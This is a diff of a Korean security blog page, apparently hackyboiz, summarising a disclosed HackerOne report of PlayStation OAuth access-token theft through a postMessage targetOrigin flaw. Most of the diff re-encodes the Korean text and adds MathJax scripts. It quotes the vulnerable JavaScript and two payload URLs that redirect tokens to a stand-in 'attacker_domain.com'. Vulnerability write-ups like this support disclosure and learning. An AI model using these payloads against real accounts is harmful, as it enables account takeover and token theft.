@@ -61,7 +61,7 @@
   <script src="/js/utils.js"></script>
   <script src="/js/color-schema.js"></script>
 
-<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
+<meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
 </head>
 
 <body>
@@ -189,7 +189,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      353 자
+      519 자
     </span>
   
 
@@ -199,7 +199,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      7
+      10
        분
     </span>
   
@@ -242,46 +242,46 @@
               </script>
               <h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://hackerone.com/reports/821896">Access token stealing in playstation</a></p>
 <h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://my.playstation.com/">https://my.playstation.com</a></p>
-<h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>콘솔 게임기기인 PlayStation의 커뮤니티 <a target="_blank" rel="external nofollow noopener noreferrer" href="https://my.playstation.com/auth/response.html">https://my.playstation.com/auth/response.html</a> 에서 로그인된 사용자의 Access Token을 탈취할 수 있는 취약점이 발견되었습니다.</p>
-<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://my.playstation.com/auth/response.html?requestID=iframe_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1&amp;baseUrl=/&amp;targetOrigin=https://my.playstation.com">https://my.playstation.com/auth/response.html?requestID=iframe_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1&amp;baseUrl=/&amp;targetOrigin=https://my.playstation.com</a> 페이지는 발급 서버에서 클라이언트로 OAuth 액세스 토큰을 전송하는 자바스크립트를 호스팅 합니다.</p>
-<pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parseResponse</span>(<span class="hljs-params">a</span>) </span>&#123;
+<h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xCF58;&#xC194; &#xAC8C;&#xC784;&#xAE30;&#xAE30;&#xC778; PlayStation&#xC758; &#xCEE4;&#xBBA4;&#xB2C8;&#xD2F0; <a target="_blank" rel="external nofollow noopener noreferrer" href="https://my.playstation.com/auth/response.html">https://my.playstation.com/auth/response.html</a> &#xC5D0;&#xC11C; &#xB85C;&#xADF8;&#xC778;&#xB41C; &#xC0AC;&#xC6A9;&#xC790;&#xC758; Access Token&#xC744; &#xD0C8;&#xCDE8;&#xD560; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
+<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://my.playstation.com/auth/response.html?requestID=iframe_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1&amp;baseUrl=/&amp;targetOrigin=https://my.playstation.com">https://my.playstation.com/auth/response.html?requestID=iframe_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1&amp;baseUrl=/&amp;targetOrigin=https://my.playstation.com</a> &#xD398;&#xC774;&#xC9C0;&#xB294; &#xBC1C;&#xAE09; &#xC11C;&#xBC84;&#xC5D0;&#xC11C; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xB85C; OAuth &#xC561;&#xC138;&#xC2A4; &#xD1A0;&#xD070;&#xC744; &#xC804;&#xC1A1;&#xD558;&#xB294; &#xC790;&#xBC14;&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xD638;&#xC2A4;&#xD305; &#xD569;&#xB2C8;&#xB2E4;.</p>
+<pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parseResponse</span>(<span class="hljs-params">a</span>) </span>{
     <span class="hljs-keyword">var</span> b = a.hash.substr(<span class="hljs-number">1</span>),
         c = a.search.substr(<span class="hljs-number">1</span>),
         d = b + <span class="hljs-string">&quot;&amp;&quot;</span> + c,
         e = convertToObject(d);
     <span class="hljs-keyword">return</span> e.refererURL = a.toString(), e
-&#125;
+}
 ....
 
-<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sendResponseToApp</span>(<span class="hljs-params">a</span>) </span>&#123;
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sendResponseToApp</span>(<span class="hljs-params">a</span>) </span>{
     <span class="hljs-keyword">var</span> b = extractFrameTypeFromRequestID(a.requestID),
         c = a.targetOrigin || getOrigin(),
         d = a.baseUrl || <span class="hljs-string">&quot;&quot;</span>,
         e = a.returnRoute || <span class="hljs-string">&quot;&quot;</span>,
         f = a.excludeQueryParams,
         g = !f &amp;&amp; <span class="hljs-built_in">window</span>.location.search || <span class="hljs-string">&quot;&quot;</span>;
-    <span class="hljs-keyword">switch</span> (b) &#123;
+    <span class="hljs-keyword">switch</span> (b) {
 ...
         <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;window&quot;</span>:
             <span class="hljs-built_in">window</span>.opener.postMessage(a, c);
             <span class="hljs-keyword">break</span>;
 ...
-    &#125;
-&#125;
+    }
+}
 
 <span class="hljs-keyword">var</span> response = parseResponse(<span class="hljs-built_in">window</span>.location);
 sendResponseToApp(response);</code></pre>
 
-<p>호스팅된 위 자바스크립트에서 아래 과정을 통해 access token을 해커의 서버로 전송할 수 있습니다.</p>
+<p>&#xD638;&#xC2A4;&#xD305;&#xB41C; &#xC704; &#xC790;&#xBC14;&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xC5D0;&#xC11C; &#xC544;&#xB798; &#xACFC;&#xC815;&#xC744; &#xD1B5;&#xD574; access token&#xC744; &#xD574;&#xCEE4;&#xC758; &#xC11C;&#xBC84;&#xB85C; &#xC804;&#xC1A1;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <ol>
-<li>request query를 <code>parseResponse()</code> 함수에서 파싱 한 뒤  <code>sendResponseToApp()</code> 의 매개변수로 전달해 호출합니다.</li>
-<li>query 중 <code>reqeustID</code> 필드 값이 “window” 면 <code>window.opener.postMessage()</code>를 호출합니다.</li>
-<li><code>window.opener.postMessage()</code> 는 첫 번째 매개변수를 두 번째 매개변수인 특정 도메인으로 전달할 수 있습니다. 매개변수로 query와 <code>targetOrigin</code> 필드 값이 전달되면 <code>targetOrigin</code> 도메인으로 query에 포함되어 있는 Access Token을 전송할 수 있습니다.</li>
+<li>request query&#xB97C; <code>parseResponse()</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xD30C;&#xC2F1; &#xD55C; &#xB4A4;  <code>sendResponseToApp()</code> &#xC758; &#xB9E4;&#xAC1C;&#xBCC0;&#xC218;&#xB85C; &#xC804;&#xB2EC;&#xD574; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;.</li>
+<li>query &#xC911; <code>reqeustID</code> &#xD544;&#xB4DC; &#xAC12;&#xC774; &#x201C;window&#x201D; &#xBA74; <code>window.opener.postMessage()</code>&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;.</li>
+<li><code>window.opener.postMessage()</code> &#xB294; &#xCCAB; &#xBC88;&#xC9F8; &#xB9E4;&#xAC1C;&#xBCC0;&#xC218;&#xB97C; &#xB450; &#xBC88;&#xC9F8; &#xB9E4;&#xAC1C;&#xBCC0;&#xC218;&#xC778; &#xD2B9;&#xC815; &#xB3C4;&#xBA54;&#xC778;&#xC73C;&#xB85C; &#xC804;&#xB2EC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB9E4;&#xAC1C;&#xBCC0;&#xC218;&#xB85C; query&#xC640; <code>targetOrigin</code> &#xD544;&#xB4DC; &#xAC12;&#xC774; &#xC804;&#xB2EC;&#xB418;&#xBA74; <code>targetOrigin</code> &#xB3C4;&#xBA54;&#xC778;&#xC73C;&#xB85C; query&#xC5D0; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xB294; Access Token&#xC744; &#xC804;&#xC1A1;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li>
 </ol>
-<p>이를 이용한 최종 페이로드는 다음과 같습니다.</p>
+<p>&#xC774;&#xB97C; &#xC774;&#xC6A9;&#xD55C; &#xCD5C;&#xC885; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs jsx">https:<span class="hljs-comment">//my.playstation.com/auth/response.html?requestID=window_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1&amp;baseUrl=/&amp;targetOrigin=https://attacker_domain.com </span></code></pre>
 
-<p>위 페이로드를 OAuth 발급 서버 request query의 <code>redirect_uri</code> 필드 값으로 보내면 Access Token을 탈취할 수 있습니다.</p>
+<p>&#xC704; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; OAuth &#xBC1C;&#xAE09; &#xC11C;&#xBC84; request query&#xC758; <code>redirect_uri</code> &#xD544;&#xB4DC; &#xAC12;&#xC73C;&#xB85C; &#xBCF4;&#xB0B4;&#xBA74; Access Token&#xC744; &#xD0C8;&#xCDE8;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs jsx">https:<span class="hljs-comment">//auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize?response_type=token&amp;scope=capone:report_submission,kamaji:game_list,kamaji:get_account_hash,user:account.get,user:account.profile.get,kamaji:social_get_graph,kamaji:ugc:distributor,user:account.identityMapper,kamaji:music_views,kamaji:activity_feed_get_feed_privacy,kamaji:activity_feed_get_news_feed,kamaji:activity_feed_submit_feed_story,kamaji:activity_feed_internal_feed_submit_story,kamaji:account_link_token_web,kamaji:ugc:distributor_web,kamaji:url_preview&amp;client_id=656ace0b-d627-47e6-915c-13b259cd06b2&amp;redirect_uri=https://my.playstation.com/auth/response.html?requestID=window_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1&amp;baseUrl=/&amp;targetOrigin=https://attacker_domain.com/&amp;prompt=non</span></code></pre>
 
 
@@ -584,6 +584,45 @@ sendResponseToApp(response);</code></pre>
 
 
 
+
+  
+
+  
+    <!-- MathJax -->
+    <script>
+      MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']]
+        },
+        options: {
+          renderActions: {
+            findScript: [10, doc => {
+              document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+                const display = !!node.type.match(/; *mode=display/);
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+                const text = document.createTextNode('');
+                node.parentNode.replaceChild(text, node);
+                math.start = { node: text, delim: '', n: 0 };
+                math.end = { node: text, delim: '', n: 0 };
+                doc.math.push(math);
+              });
+            }, '', false],
+            insertedScript: [200, () => {
+              document.querySelectorAll('mjx-container').forEach(node => {
+                let target = node.parentNode;
+                if (target.nodeName.toLowerCase() === 'li') {
+                  target.parentNode.classList.add('has-jax');
+                }
+              });
+            }, '', false]
+          }
+        }
+      };
+    </script>
+
+    <script async src="https://cdn.staticfile.org/mathjax/3.0.5/es5/tex-svg.js"></script>
+
+  
 
 
 
